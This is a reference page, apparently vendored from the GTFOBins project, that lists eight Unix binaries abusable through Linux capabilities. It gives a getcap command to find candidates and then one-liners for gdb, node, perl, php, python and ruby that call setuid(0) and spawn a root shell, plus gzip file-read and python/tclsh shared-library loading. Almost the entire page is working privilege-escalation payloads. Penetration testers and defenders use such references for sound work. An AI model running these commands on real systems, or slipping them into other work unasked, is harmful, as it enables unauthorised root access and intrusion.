---
title: "GTFOBins - capabilities context (8 binaries)"
category: "misc"
subcategory: "privilege-escalation"
type: "reference"
tags: ["gtfobins", "privilege-escalation", "privesc", "shell-escape", "restricted-shell", "linux", "post-exploitation", "binary-abuse", "lolbins", "living-off-the-land", "capabilities", "escalation-path"]
summary: "8 Unix binaries abusable in the capabilities context, with the payload and the primitive each one yields."
source:
  name: "GTFOBins/GTFOBins.github.io"
  url: "https://github.com/GTFOBins/GTFOBins.github.io"
license: "GPL-3.0"
---

## What this page is

Every GTFOBins binary that is abusable in the **capabilities** context, grouped by binary, with the function each payload provides. 8 binaries.

## Step 1: find out what you have

```bash
getcap -r / 2>/dev/null
```

## Step 2: look it up

### gdb

**shell** — spawns an interactive shell

```bash
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
```

### gzip

**file-read** — reads an arbitrary file

```bash
gzip -c /path/to/input-file | gzip -d
```

### node

**shell** — spawns an interactive shell

```bash
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

### perl

**shell** — spawns an interactive shell

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
```

### php

**shell** — spawns an interactive shell

```bash
php -r 'posix_setuid(0); system("/bin/sh -i");'
```

**shell** — spawns an interactive shell

```bash
php -r 'posix_setuid(0); passthru("/bin/sh -i");'
```

**shell** — spawns an interactive shell

```bash
php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```

**shell** — spawns an interactive shell

```bash
php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
```

### python

**library-load** — loads an arbitrary shared library

```bash
python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
```

**shell** — spawns an interactive shell

```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

### ruby

**shell** — spawns an interactive shell

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```

### tclsh

**library-load** — loads an arbitrary shared library

```bash
tclsh
load /path/to/lib.so x
```

## Attribution

Data from [GTFOBins](https://gtfobins.github.io/) (commit `acd524623f9c`), licensed GPL-3.0. Vendored at `vendor/GTFOBins/_gtfobins/`.
